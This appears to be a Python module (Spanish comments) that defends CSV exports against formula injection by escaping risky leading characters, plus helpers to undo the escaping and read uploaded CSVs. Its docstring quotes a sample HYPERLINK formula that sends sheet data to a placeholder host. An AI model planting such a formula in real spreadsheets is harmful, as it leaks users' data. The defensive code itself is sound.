"""Escritor CSV que neutraliza la inyeccion de formulas.

Excel y LibreOffice ejecutan como formula cualquier celda que empiece por = + - @
(o tabulador / retorno): un producto llamado `=HYPERLINK("http://x/?"&A1,"clic")`
se convertia en un enlace que filtra el resto de la hoja al abrir el export.
Se antepone una comilla simple, que el programa de hojas no muestra.
"""
import csv
import re

_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")


_NUMERO = re.compile(r"^[-+]?\d+(?:[.,]\d+)?$")  # "-5,00" es un numero, no una formula


def proteger(valor):
    if isinstance(valor, str) and valor.startswith(_PELIGROSOS) and not _NUMERO.match(valor):
        return "'" + valor
    return valor


class EscritorCsvSeguro:
    def __init__(self, destino, delimiter=";"):
        self._writer = csv.writer(destino, delimiter=delimiter)

    def writerow(self, fila):
        # Los numeros negativos de verdad (int/float) no son texto y no se tocan.
        self._writer.writerow([proteger(v) for v in fila])


def desproteger(valor):
    """Inversa de proteger() al importar un CSV exportado por la propia app."""
    if isinstance(valor, str) and len(valor) > 1 and valor[0] == "'" and valor[1] in "=+-@\t\r":
        return valor[1:]
    return valor


def leer_csv_subido(archivos, max_filas, campo="fichero"):
    """Filas (dicts) de un CSV subido con el formato de los /exportar (UTF-8, ';').

    Devuelve None si no se subio fichero; lanza ValidationError si no es texto. Se leen como
    mucho `max_filas` filas: un CSV enorme no debe poder bloquear la peticion."""
    import io
    from .validation import ValidationError

    archivo = archivos.get(campo)
    if archivo is None or archivo.filename == "":
        return None
    try:
        texto = archivo.read().decode("utf-8-sig")
    except UnicodeDecodeError as e:
        raise ValidationError("El fichero debe ser un CSV de texto") from e
    filas = []
    for i, fila in enumerate(csv.DictReader(io.StringIO(texto), delimiter=";")):
        if i >= max_filas:
            break
        filas.append(fila)
    return filas
